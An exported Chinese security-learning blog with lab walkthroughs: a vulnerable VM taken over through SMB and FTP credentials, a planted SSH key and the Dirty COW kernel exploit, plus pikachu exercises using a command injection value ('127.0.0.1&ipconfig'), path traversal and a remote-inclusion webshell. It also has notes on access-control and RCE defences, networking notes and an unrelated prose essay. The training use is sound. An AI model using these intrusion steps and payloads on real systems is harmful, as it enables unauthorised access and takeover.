<h3 id="尝试FTP匿名登录-21端口"><a href="#尝试FTP匿名登录-21端口" class="headerlink" title="尝试FTP匿名登录(21端口)"></a>尝试FTP匿名登录(21端口)</h3><p>首先知道:anonymous是匿名用户。<br>匿名登陆成功。<br><img src="https://pic.imgdb.cn/item/65464b7bc458853aefbd0723.jpg"><br>那我们操作一下,看一下有什么敏感文件。<br><img src="https://pic.imgdb.cn/item/65464b8ac458853aefbd4562.jpg"><br>如上图,发现不了什么敏感文件,接下来换ssh。</p>
<h3 id="ssh服务-22端口"><a href="#ssh服务-22端口" class="headerlink" title="ssh服务(22端口)"></a>ssh服务(22端口)</h3><p>首先ssh连接的语句:</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> smbuser<span class="hljs-variable">@ip</span><br></code></pre></td></tr></table></figure>
<p>发现无权限进行操作。(需要公私钥(密钥对)才可进行连接)</p>
<h3 id="SMB共享服务-445端口"><a href="#SMB共享服务-445端口" class="headerlink" title="SMB共享服务(445端口)"></a>SMB共享服务(445端口)</h3><p>由于445端口开启的是SMB共享服务,那么可以有以下思路:<br>使用smbmap对smb信息枚举<br><code>SMBMap允许用户枚举整个域中的samba共享驱动器。用户可以使用该工具列出共享驱动器、驱动器权限、共享内容、上传/下载功能、文件名自动下载模式匹配，甚至远程执行命令。该工具原本的设计初衷是为了简化在大型网络中搜索潜在敏感数据的过程。</code></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">smbmap</span> -H <span class="hljs-number">192.168.146.129</span><br></code></pre></td></tr></table></figure>
<p>发现共享文件夹sbmdata有读写权限。<br><img src="https://pic.imgdb.cn/item/65464ba1c458853aefbda5cb.jpg"><br>使用smbclient来连接这个文件夹试一试(交互式登录),密码还是尝试刚才获取到的,成功连接。<br><img src="https://pic.imgdb.cn/item/65464bcac458853aefbe4f5a.jpg"><br>get secure后,在文件夹查看,发现一个用户名密码(这个用户名是用来登录ftp的重要key)。<br><img src="https://pic.imgdb.cn/item/65464bddc458853aefbe9e91.jpg"></p>
<h2 id="开干"><a href="#开干" class="headerlink" title="开干"></a>开干</h2><p>那其实这里其实有思路了,<code>就是通过smbdata的可写操作伪造私钥,实现ssh登录从而getshell。</code></p>
<h3 id="查看ssh配置文件"><a href="#查看ssh配置文件" class="headerlink" title="查看ssh配置文件"></a>查看ssh配置文件</h3><p>登录ftp查看ssh配置文件(由于前面是匿名用户所以看不到配置文件)。<br>经过尝试用户名为smbuser,密码为rootroot1,登陆后get ssh配置文件。<br><img src="https://pic.imgdb.cn/item/65464bf0c458853aefbef2dd.jpg"><br>在kali文件夹查看ssh配置文件,发现用户密钥文件存放路径为~&#x2F;.ssh&#x2F;authorized_keys。<br><img src="https://pic.imgdb.cn/item/65464c0cc458853aefbf6ac3.jpg"></p>
<h3 id="伪造公钥私钥并且上传"><a href="#伪造公钥私钥并且上传" class="headerlink" title="伪造公钥私钥并且上传"></a>伪造公钥私钥并且上传</h3><p>别急着关闭ftp服务,然后在smbuser用户下创建一个ssh目录，用于伪造公钥和私钥创建连接。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> ~/.ssh<br></code></pre></td></tr></table></figure>
<p>新打开一个shell窗口，创建公钥和私钥</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen -t rsa</span><br></code></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/65464c2bc458853aefbff51e.jpg"><br>然后上传公钥到.ssh&#x2F;authorized_keys目录下</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">put <span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/id_rsa.pub ~/</span>.ssh/authorized_keys<br></code></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/65464c42c458853aefc05960.jpg"></p>
<h3 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h3><p>这时尝试使用ssh连接,成功登陆上,但是权限太低了,查看内核版本号发现可以使用脏牛提权。<br><img src="https://pic.imgdb.cn/item/65464c57c458853aefc0bceb.jpg"><br>接下来就进行脏牛提权<br>新开一个shell,键入</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><code class="hljs mipsasm">searchsploit <span class="hljs-keyword">dirty </span>   <span class="hljs-comment">#搜索漏洞库</span><br>searchsploit -m <span class="hljs-number">40616</span>.c  <span class="hljs-comment">#下载到本地</span><br></code></pre></td></tr></table></figure>
<p>继续开启ftp服务，上传脏牛文件到靶机。<br><img src="https://pic.imgdb.cn/item/65464d4ec458853aefc58fb6.png"><br>然后使用ssh连接,gcc编译提权。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">gcc -ptheard dirty.c -o dirty -lcrypt <span class="hljs-comment">#gcc编译</span><br>./dirty 123456 <span class="hljs-comment">#运行</span><br></code></pre></td></tr></table></figure>
<p>成功提权,成为root。<br><img src="https://pic.imgdb.cn/item/65464c66c458853aefc10c7a.jpg"></p>
<h3 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h3><p>最后便可以开心的获取flag啦！<br><img src="https://pic.imgdb.cn/item/65464cfec458853aefc42e7d.jpg"></p>
<h2 id="总结-一些觉得有用的klg"><a href="#总结-一些觉得有用的klg" class="headerlink" title="总结|一些觉得有用的klg"></a>总结|一些觉得有用的klg</h2><p>1、这是我第一次打这种靶机,学习到了不少知识点,这种需要依靠你一步一步扫描探索的靶机是会比打那些ctf更全面一点点的。<br>2、主要渗透思路:扫描主机、扫描端口、扫描目录、根据端口进行测试。<br>3、匿名用户是anonymous。<br>以下知识点from:<a href="https://www.cnblogs.com/dg05/p/17805595.html">https://www.cnblogs.com/dg05/p/17805595.html</a><br>4、searchsploit<br>searchsploit是集成在kali中的命令。kali中有一个本地漏洞库，可以searchsploit命令进行漏洞查询，查询成功后可以看到对应的exp<br>searchsploit的简单使用：<br>查找linux内核版本3.1的漏洞：searchsploit linux kernel 3.1<br>配合grep查找内核3.1的提权漏洞：searchsploit linux kernel 3.1 | grep ‘Privilge Escalation’<br>假如exp为40616.c，将其拷贝到当前目录：earchsploit -m 40616 <br>5、ssh-keygen<br>ssh-keygen是生成公私钥的工具，默认保存在~&#x2F;.ssh中，私钥为id_rsa，公钥为id_rsa.pub<br>参数：<br>-t，指定生成密钥类型（rsa，dsa），默认rsa<br>-f，指定存放密钥的路径，默认~&#x2F;.ssh<br>-P，指定私钥的密码<br>如:</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen -t rsa</span><br></code></pre></td></tr></table></figure>
<p>6、ssh免密登录<br>  1.在客户端用ssh-keygen生成公私钥。<br>  2.将公钥追加到服务器的authorized_keys文件中（一般在用户家目录的.ssh下,有时候还需要自己创建）。<br>  3.客户端通过ssh对服务器发起请求，并把公钥传递到服务器。<br>  4.服务器检索authorized_keys，确认公钥是否存在。<br>  5.如果存在，生成随机数R，并用公钥加密。<br>  6.将密文传输到客户端。<br>  7.客户端用私钥解密密文，得到R。<br>  8.服务端和客户端通信会产生一个会话id（SessionKey），客户端用md5对R和SessionKey加密生成密文。<br>  9.客户端将md5密文传给服务器。<br>  10.服务器端同样生成md5(R,SessionKey)。<br>  11.如果两个密文匹配，则认证成功,实现了ssh免密登录。</p>
]]></content>
      <tags>
        <tag>实战练习心得</tag>
      </tags>
  </entry>
  <entry>
    <title>水平垂直越权</title>
    <url>/2023/10/17/luojiyuequan/</url>
    <content><![CDATA[<h2 id="大纲"><a href="#大纲" class="headerlink" title="大纲"></a>大纲</h2><p><img src="https://pic.imgdb.cn/item/652e9c6bc458853aef0bd201.png" alt="图一" title="逻辑越权学习"><br>逻辑越权漏洞不像前面那些漏洞一样具有一定的系统影响（危害大）,只是一些代码层面上的逻辑漏洞。<br>此类漏洞不限于各种脚本，不与网站脚本以及搭建环境相关,是一类通用漏洞。</p>
<h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p>1、越权分为水平越权以及垂直越权、还有未授权访问。<br><img src="https://pic.imgdb.cn/item/652e9f5bc458853aef1283f6.png" alt="图二" title="水平越权以及垂直越权"><br>2、基本概念:<br> 水平越权(危害较小–平级用户间的跨越):通过更换的某个 ID 之类的身份标识，从而使 A 账号获取（修改、删除等）B 账号数据。<br> 垂直越权(危害较大–权限的跨越):使用低权限身份的账号，发送高权限账号才能有的请求，获得其高权限的操作–但是实现前提比较苛刻（感觉与CSRF差不多,都要获取对应敏感操作的数据包,只不过垂直越权看重的是获取那个数据包的cookie）。<br> 未授权访问:通过删除请求中的认证信息后重放该请求，依旧可以访问或者完成操作–不需要用户(不需要登录)。<br> 3、漏洞成因:<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=32&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">本地pikachu靶场演示水平垂直漏洞成因(重要,因为不止讲了成因,还有一些思路):6:58</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=32&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">墨者水平-身份认证失效漏洞实战（漏洞成因）:27:28</a><br>(1)、burp suite的活学活用,不可拘泥于抓包。<br>4、漏洞原理<br>(1)、前端安全造成(前端代码逻辑问题),安全验证写在前端（判断用户等级之后，在用户的代码界面进行可选显示）–仅仅只是判断等级,不给予显示而已,但数据内容存在。<br>ps:但是如果前端在用户申请某一操作前进行安全验证,那这种是有效的,较为安全。<br>(2)、后端安全造成,数据库验证。一般按照组编号或用户类型编号判断当前用户属于什么级别。如果在访问数据包中有传输用户的编号、用户组编号或类型编号的时候，那么尝试对这个值进行修改，就是测试越权漏洞的基本操作。</p>
<h2 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h2><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=32&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">越权检测-小米范越权漏洞检测工具（工具使用）:1:04:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=32&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">越权检测-Burpsuite 插件 Authz 安装测试（插件使用）–推荐:1:09:00</a></p>
<h3 id="修复防御方案"><a href="#修复防御方案" class="headerlink" title="修复防御方案"></a>修复防御方案</h3><p>1.前后端同时对用户输入信息进行校验，双重验证机制<br>2.调用功能前验证用户是否有权限调用相关功能<br>3.执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限<br>4.直接对象引用的加密资源 ID，防止攻击者枚举 ID，敏感数据特殊化处理<br>5.永远不要相信来自用户的输入，对于可控参数进行严格的检查与过滤</p>
]]></content>
      <categories>
        <category>业务逻辑越权</category>
      </categories>
      <tags>
        <tag>业务逻辑越权</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE|代码以及命令执行漏洞</title>
    <url>/2023/10/14/minglingzhixing/</url>
    <content><![CDATA[<h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>在 Web 应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用 代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代 码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞。<br><img src="https://pic.imgdb.cn/item/6529fdd5c458853aefdf09c9.png" alt="图一" title="RCE漏洞图解"><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=29&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">分析漏洞产生原因:15:00</a></p>
<h3 id="漏洞形成条件-缺一不可"><a href="#漏洞形成条件-缺一不可" class="headerlink" title="漏洞形成条件(缺一不可)"></a>漏洞形成条件(缺一不可)</h3><p>1、可控变量<br>2、漏洞函数</p>
<h2 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h2><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=29&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">两个小案例略微说明这两种漏洞:5:50</a><br>1、代码执行漏洞典例:php eval()函数:把括号内的语句当作php代码执行。<br>2、命令执行漏洞典例:php system()函数:把()的内容当作当前操作系统cmd命令执行,并可以通过echo输出。<br>3、可以知道,利用这个漏洞,可以对系统产生多样的危害。例如,我可以利用文件上传的函数(代码执行)上传一个木马文件,然后通过命令执行漏洞去执行这个木马。<br>4、此类漏洞相对较前面那几类漏洞在网站的出现几率要小,要具体看网站的作用。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=29&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">如何测试是否存在两种漏洞:23:10</a><br>1、主要是具体情况具体分析,看页面主要是为了完成什么任务。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=29&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">mozhe靶场演示命令执行漏洞(黑盒)–黑盒功能点命令执行-应用功能:28:00</a><br>1、linux下|符号可以执行多条命令(管道服务)。<br>2、”&lt;”是空格的另一种形式&#x2F;输入重定向?–cat&lt;a.php<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=29&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">mozhe靶场演示命代码执行漏洞(白盒)–白盒代码及命令执行-代码分析:43:00</a><br>1、tac k.php(反引号执行系统命令)–相当于读取k.txt<br>2、echo可以显示命令执行结果。对于eval(),正常来说是代码执行,但是若是eval(echo&#96;&#96;),则是命令执行–linux特性,反单引号可以执行系统命令。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=29&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">黑盒层 RCE 漏洞检测-公开漏洞:1:00:00</a><br>1、学会利用网上公开的漏洞辅助。<br>2、poc是验证漏洞是否存在、exp是利用漏洞<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=29&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">webshell一句话后门初步原理理解–菜刀、蚁剑原理:1:26:20</a></p>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>1、敏感函数禁用:如eval、assert等<br>2、变量过滤或固定(固定常用)<br>3、WAF产品</p>
]]></content>
      <categories>
        <category>代码|命令执行漏洞</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>内网|外网|小姿势</title>
    <url>/2023/11/05/neiwang/</url>
    <content><![CDATA[<p>今天道听途说地听到一些计网知识,权当复习吧,记录一下。</p>
<h2 id="内网-外网"><a href="#内网-外网" class="headerlink" title="内网|外网"></a>内网|外网</h2><p>1、内网简单来说就是在同一个路由器连接下,所有主机的一个集合体构成了一个内网。<br>2、外网简单来说就是内网外的互联网,如谷歌、百度这些。</p>
<h2 id="内网ip-外网ip"><a href="#内网ip-外网ip" class="headerlink" title="内网ip|外网ip"></a>内网ip|外网ip</h2><p>外网ip(非保留ip)|内网ip(保留ip)<br>1、内网可以通过NAT,端口映射的方式,内网的所有主机共同拥有一个外网ip,这才可以上网(连到外网)。<br>2、而外网ip在原则上访问不了内网。<br>3、我们平时直接接触最多的是内网IP。而且还可以自己手动修改IP地址。而外网IP，我们很少直接接触，都是间接接触、因为外网IP一般都是运营商管理，而且是全球唯一的，一般我们自己是无法修改的。<br>4、内网IP和外网IP是指在网络中用于标识计算机或其他设备的地址。内网IP是指在局域网中使用的IP地址，外网IP是指在公共网络中使用的IP地址。<br>内网IP通常由路由器或交换机分配，它们是在私有地址空间中的IP地址，如10.0.0.0&#x2F;8、172.16.0.0&#x2F;12和192.168.0.0&#x2F;16。这些地址是专门为内部使用而保留的，因此无法从公共网络中访问。内网IP可以在一个局域网中共享，而无需公共网络的支持。这意味着内网IP可以更快地传输数据，因为它们不需要经过公共网络的路由器和服务器。<br>外网IP是指在公共网络中使用的IP地址。这些地址是由互联网服务提供商（ISP）分配的，它们是全球唯一的。外网IP可以通过公共网络访问，因此可以从任何地方访问。这是因为外网IP是在全球范围内唯一的，它们用于标识互联网上的每个设备。<br>5、外网IP是必要的，因为它们允许设备在互联网上相互通信。例如，当您访问网站或发送电子邮件时，您的设备需要使用外网IP地址与互联网上的其他设备进行通信。<br>6、内网IP和外网IP都是用于标识计算机或其他设备的地址，但它们在使用和访问方面有所不同。内网IP只能在局域网中使用，而外网IP可以在全球范围内访问。<br>7、在一定程度上,外网&#x3D;公网;内网&#x3D;私网。<br><code>from</code><br><a href="https://blog.csdn.net/m0_61251376/article/details/122667739">https://blog.csdn.net/m0_61251376/article/details/122667739</a><br><a href="https://zhuanlan.zhihu.com/p/650583255?utm_id=0">https://zhuanlan.zhihu.com/p/650583255?utm_id=0</a></p>
<h2 id="网关-路由器"><a href="#网关-路由器" class="headerlink" title="网关|路由器"></a>网关|路由器</h2><p>1、网关是一个局域网连接到另一个局域网的接口;路由器是连接一个局域网所有主机的设备。<br>2、也就是说,一个局域网内的所有主机通过路由器连接,在通过网关才可与另一个局域网连接通讯。<br><code>from</code><br><a href="https://www.zhihu.com/question/21787311/answer/2683696971">https://www.zhihu.com/question/21787311/answer/2683696971</a></p>
<h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><p>1、前面说到,内网可以通过NAT、端口映射的方式来访问外网;而外网在原则上不可连接到内网。<br>可以通过端口映射、VPN等的方式实现从外网访问到内网资源。<br>2、那么作为一名渗透测试人员,我们是不是应该想到有没有可能通过外网非法访问内网,实现攻击？<br>答案是肯定的,这就是内网穿透。<br><code>学习链接</code><br><a href="https://blog.csdn.net/qq_61553520/article/details/131037631">https://blog.csdn.net/qq_61553520/article/details/131037631</a><br><a href="https://zhuanlan.zhihu.com/p/604809193?utm_id=0">https://zhuanlan.zhihu.com/p/604809193?utm_id=0</a></p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>WEB漏洞知识</tag>
      </tags>
  </entry>
  <entry>
    <title>My First Blog</title>
    <url>/2023/09/10/one/</url>
    <content><![CDATA[<p>   落日像喝醉酒的红脸醉汉，跌倒在乡村的山那里，把水和天映得一半通红，一半金黄。<br>　　乡村的黄昏是秀美、恬静的。<br>　　路边的花呀、草呀，都在徐徐晚风的抚摸下，安静地睡了，夜来香们却精神十足地梳妆打扮，<br>准备迎接“黄昏音乐会”，她们用绚丽的晚霞做胭脂，涂红娇美的脸蛋；用金黄的阳光做长裙，套<br>上柔韧的腰肢，向小河哥哥要一朵浪花，插上自己五彩的秀发……河边的垂柳散开高高的发髻，取下<br>美艳的蝴蝶结，俯下身去，让长发垂进潺潺的.流水，静静梳洗着。顽皮的小河也不再跳跃，安分地<br>淌着。河里的睡莲闭起了眼睑，弯弯的长睫毛上还挂着水珠。河里的小鱼和小虾们都回家了，想必<br>是他们的爸爸、妈妈召唤着他们吃晚饭吧！<br>　　乡村的黄昏又是忙碌、热闹的。<br>　　“日落西山鸟归林。”形形色色的鸟儿都急急忙忙地往屋里赶。鸟爸爸要把找到的食物带回<br>家，鸟妈妈要回去做饭，仅有一些贪玩的小鸟还在不紧不慢地往家里赶。<br>　　河边的洗衣妇提着水桶三三两两回来了，边走边谈论着村里的新鲜事，放牛的牧童横坐在牛背<br>上归来了，口袋里塞满了酸极甜极的野果。到地里做活的壮劳力也都回来了，个个扛着农具，汗流<br>浃背。不一会儿，各家各户的烟囱都冒出了缕缕炊烟，厨房的响起了锅碗瓢盆的交响乐，吃过晚<br>饭，一些老头儿叼着烟斗蹲在一起谈古论今，谈三国，谈刘备……<br>　　这时，一弯新月已隐隐约约挂在夜空，少年也匆匆踏上了归途。</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>发牢骚</tag>
      </tags>
  </entry>
  <entry>
    <title>pikachu通关回放</title>
    <url>/2023/10/14/pikachuAccess/</url>
    <content><![CDATA[<p>本来不打算做的,因为时间紧任务重,但心血来潮,想整这么玩意,献丑了。<br>参考文献:<a href="https://blog.csdn.net/weixin_52385170/article/details/128093840">https://blog.csdn.net/weixin_52385170/article/details/128093840</a></p>
<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><h3 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h3><p>不多说,随便输入一个用户名与密码,直接抓包发送到inturder,设置好爆破即可。<br>只有一个注意点,你要爆几个字段,那么你就要导入多少个字典。<br><img src="https://pic.imgdb.cn/item/653b2573c458853aef70fc14.jpg" alt="图一" title="字典一"><br><img src="https://pic.imgdb.cn/item/653b25ebc458853aef72495a.jpg" alt="图一" title="字典二"><br>之后就开始爆破。<br>观察到有一个数据包的长度明显不同于其他,那么这一对可能匹配。<br><img src="https://pic.imgdb.cn/item/653b2634c458853aef731015.jpg" alt="图一" title="发现异常数据包"><br>成功<br><img src="https://pic.imgdb.cn/item/653b2649c458853aef734c72.jpg" alt="图一" title="成功"></p>
<h3 id="验证码绕过-验证在客户端"><a href="#验证码绕过-验证在客户端" class="headerlink" title="验证码绕过(验证在客户端)"></a>验证码绕过(验证在客户端)</h3><p>直接浏览器禁用js或者验证码复用(把第一次的验证码固定)即可,其他均与上述一致。<br><img src="https://pic.imgdb.cn/item/653b2654c458853aef7366c1.jpg" alt="图一" title="验证码不要动"></p>
<h3 id="验证码绕过-验证在服务器端"><a href="#验证码绕过-验证在服务器端" class="headerlink" title="验证码绕过(验证在服务器端)"></a>验证码绕过(验证在服务器端)</h3><p>这里是发现验证码没有时间限制,也就是可以复用。<br>tips:如何判断验证码是在前端验证还是在后端验证:直接输入一个错误的验证码,看他是否弹窗(弹窗一般是js)但也不全面<br>最有效的是查看源码,后端验证的话验证代码源码看不到；但是前端的话可以看到。</p>
<h3 id="带token"><a href="#带token" class="headerlink" title="带token"></a>带token</h3><p>参考:<a href="https://blog.csdn.net/m0_74977101/article/details/131833702">https://blog.csdn.net/m0_74977101/article/details/131833702</a><br>具体操作看上篇文章,这里只讲一下思路。<br>输入完成后抓包,发现带有token,先尝试token可不可以复用,发现token是每请求一次就自动刷新的。<br>继续观察,发现当前token来源于上一个返回的数据包。</p>
<h2 id="Cross-Site-Scripting–XSS"><a href="#Cross-Site-Scripting–XSS" class="headerlink" title="Cross-Site Scripting–XSS"></a>Cross-Site Scripting–XSS</h2><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="get型"><a href="#get型" class="headerlink" title="get型"></a>get型</h3><p>登录后点击可以看到个人信息<br>修改个人信息后抓包<br><img src="https://pic.imgdb.cn/item/652a943cc458853aeff78003.png" alt="图一" title="原始数据包"><br>若某种机缘巧合下,截取到修改信息的数据包,那把数据改成自己想要的,然后伪装成人畜无害的样子发给用户,诱使用户点击,点击后就会触发csrf跨站伪造请求漏洞,数据成功被修改。<br><img src="https://pic.imgdb.cn/item/652a9440c458853aeff7997e.png" alt="图二" title="成功请求"></p>
<h3 id="post型"><a href="#post型" class="headerlink" title="post型"></a>post型</h3><p>与get方式不同,可以通过抓包。参考上面那篇文章。<br>就是通过抓包得到的数据,构造一个html表单存储数据(存储在www目录下),然后点击submit即可完成修改。</p>
<h3 id="token验证型"><a href="#token验证型" class="headerlink" title="token验证型"></a>token验证型</h3><p>CSRF的主要问题是敏感操作的链接容易被伪造，那么如何让这个链接不容易被伪造？<br>Token的定义：Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌。<br>当我们点击修改个人信息的时候，从url可以看出我们访问了token_get_edit.php，执行后端代码，生成token，并且发送到前端页面，通过hidden属性隐藏起来，放在表单中,用来指定这个数据包(后端也存在这个token)。<br>当完成填入要修改的内容信息后,此时点击submit,此时表单内容以及token一起发送到后端进行验证,若token相同,则允许修改,反之拒绝。(因为如果要伪造一个数据包,由于token是随机生成的,如果刷新界面,那么就会生成一个新的token,token必定会不同,这样可以有效防止CSRF跨站伪造请求)。</p>
<h3 id="little对比"><a href="#little对比" class="headerlink" title="little对比"></a>little对比</h3><p>1、CSRF在一些情况下可以使用的,若对面没有开启token验证,则我们可以通过截取的数据包构造出我们想要的另一个数据包,访问即可达到效果。<br>2、XSS需要一定的社工,即诱使对方点击某一个带木马的链接才可以达到效果。</p>
<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h3><p>首先ping 127.0.0.1<br><img src="https://pic.imgdb.cn/item/652bea79c458853aef4426ea.png" alt="图三" title="成功请求"><br>成功<br>但是直接执行ipconfig的话<br><img src="https://pic.imgdb.cn/item/652bea88c458853aef445dc6.png" alt="图四" title="失败请求"><br>失败<br>这是由于他是ping命令,若直接填入ipconfig,相当于ping ipconfig,肯定报错<br>这里要用到windows可以利用&amp;符号来执行多条语句的方法,填入</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp;ipconfig<br></code></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/652bea92c458853aef447f38.png" alt="图五" title="成功请求"><br>成功</p>
<h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><p>顾名思义,就是直接接受你输入的php代码直接执行,究其本质是因为php代码中存在一个eval()函数,他会把你输入到括号内的语句当作php代码去执行。<br>直接输入phpinfo();<br><img src="https://pic.imgdb.cn/item/652beb59c458853aef4706f2.png" alt="图六" title="成功请求"></p>
<h3 id="little-总结"><a href="#little-总结" class="headerlink" title="little 总结"></a>little 总结</h3><p>1、RCE总体上还是可以建议测试的,因为总会有一些函数是不得不开放的,若一个网站存在这些可以执行命令或解析代码的函数,则可以利用这些函数测试。</p>
<h2 id="File-Inclusion-文件包含漏洞"><a href="#File-Inclusion-文件包含漏洞" class="headerlink" title="File Inclusion(文件包含漏洞)"></a>File Inclusion(文件包含漏洞)</h2><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p>任意选一个提交,查看网址,发现包含的是一个.php文件,由于时&#x3D;是个人电脑,我在某一个目录下创建了一个1.php文件,内容是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>我把filename值改成</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span><span class="hljs-number">1</span>.php<br></code></pre></td></tr></table></figure>
<p>成功包含了此文件,并被网页成功解析</p>
<p><img src="https://pic.imgdb.cn/item/652cf44ec458853aef499f88.png" alt="图七" title="成功请求"></p>
<h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p>前提:见参考文献<br>在远程包含漏洞中，攻击者可以通过访问外部地址来加载远程代码。在这个远程文件写入一句话木马，危害极大。<br>这里我们利用pikachu提供的一句话木马文件,存在于pikachu的test目录下的yijuhua.txt。<br>这个木马的大概作用是向当前位置创建并打开一个.php文件,并向其写入一句话木马。这个一句话木马相当于远程命令执行。<br><img src="https://pic.imgdb.cn/item/652cf7d3c458853aef530022.png" alt="图八" title="访问目标文件地址"><br>访问这个网址,不出意外的话,会在当前目录fileinclude创建一个含有一句话木马的yijuhua.php文件<br>但是我这里出了点小插曲,安全软件拦截了,问题不大,恢复出去即可。<br><img src="https://pic.imgdb.cn/item/652cf7d7c458853aef5309a5.png" alt="图九" title="成功创建"><br>然后我们就可以以此作为跳板,进行远程命令执行。<br><img src="https://pic.imgdb.cn/item/652cf8e9c458853aef55e3ac.png" alt="图十" title="成功操作"></p>
<h3 id="little-总结-1"><a href="#little-总结-1" class="headerlink" title="little 总结"></a>little 总结</h3><p>1、文件包含漏洞不需要知道目标网站的具体目录结构,因为他是在当前的文件夹包含入一个文件的。<br>2、远程包含漏洞带来的危害更大,从上述案例可以看出,利用远程包含漏洞可以把我们希望在对面执行的结果写入一个文件(比如创建一句话木马的文件),如果成功包含,即可getshell。</p>
<h2 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2><p>在这里,看网址只是显示一个总体的index主页文件,看不出什么所以然。<br>但是当我把鼠标移到图片处时,观察到网址包含filename属性。<br><img src="https://pic.imgdb.cn/item/652fcfa6c458853aef84ee0c.png" alt="图十一" title="图十一"><br>把网址复制出来观察,点到不同的图片变化的只是filename值,说明他是在当前目录下下载文件。<br>实际中,可以通过对网站的扫描可以知道该网站目录下有哪些文件,然后再跳转到那个目录下,可以完成未授权的下载。<br>我的www目录下有一个1.php文件,那么我可以通过以下方法下载到它。<br><img src="https://pic.imgdb.cn/item/652fcfb6c458853aef852e0b.png" alt="图十二" title="图十二"><br>这便是简单的文件下载。(..&#x2F;是向上级目录跳转的意思)</p>
